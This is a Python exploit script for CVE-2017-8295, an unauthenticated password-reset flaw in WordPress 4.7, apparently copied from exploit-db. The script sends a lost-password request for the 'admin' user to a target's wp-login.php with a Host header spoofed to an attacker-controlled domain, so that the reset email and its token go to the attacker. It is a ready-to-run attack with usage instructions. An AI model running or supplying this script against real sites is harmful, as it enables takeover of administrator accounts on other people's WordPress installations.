#!/usr/bin/python
from optparse import *
import requests


parser=OptionParser("""




   _______      ________    ___   ___  __ ______      ___ ___   ___  _____ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |    / _ \__ \ / _ \| ____|
 | |     \ \  / /| |__ ______ ) | | | || |   / /____| (_) | ) | (_) | |__  
 | |      \ \/ / |  __|______/ /| | | || |  / /______> _ < / / \__, |___ \ 
 | |____   \  /  | |____    / /_| |_| || | / /      | (_) / /_   / / ___) |
  \_____|   \/   |______|  |____|\___/ |_|/_/        \___/____| /_/ |____/ 
                                                                           
                                                                           


 [CVE-2017-8295]                                       
 - Release date: 03.05.2017                            
 - Revision 1.0                                        
 - Severity: Medium/High                               
  https://www.exploit-db.com/exploits/41963/           
./CVE-2017-8295.py [Option]                            
 -u /--url :: target url                               
                                                       
 -i /--inject :: inject Domain server                  
                                                       
 usage  :                                              
                                                       
 ./CVE-2017-8295.py  -u URL  -i evilDomain             
./CVE-2017-8295.py -u http://127.0.0.1 -i evel.com     
 Author :  @intx0x80                                   

""")
#https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
parser.add_option("-u" ,"--url",dest="hostwp",type="string",help="target host  ")
parser.add_option("-i" ,"--inject",dest="inj",type="string",help="remote server  ")

(option,args)=parser.parse_args()

if option.hostwp==None or option.inj==None:
    print (parser.usage)
    exit(0)

else:
    session = requests.Session()
    host=str(option.hostwp)
    inject=str(option.inj)
    paramsGet = {"action":"lostpassword"}
    paramsPost = {"wp-submit":"Get New Password","user_login":"admin","redirect_to":"wp-submit"}
    headers = {"Host":inject,"Accept-Language":"en-US,en;q=0.5","User-Agent":"Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Content-Type":"application/x-www-form-urlencoded","Connection":"close"}
    response = session.post(host+"/wp-login.php", data=paramsPost, params=paramsGet, headers=headers)

    print "Completed  check inbox [*]\n"
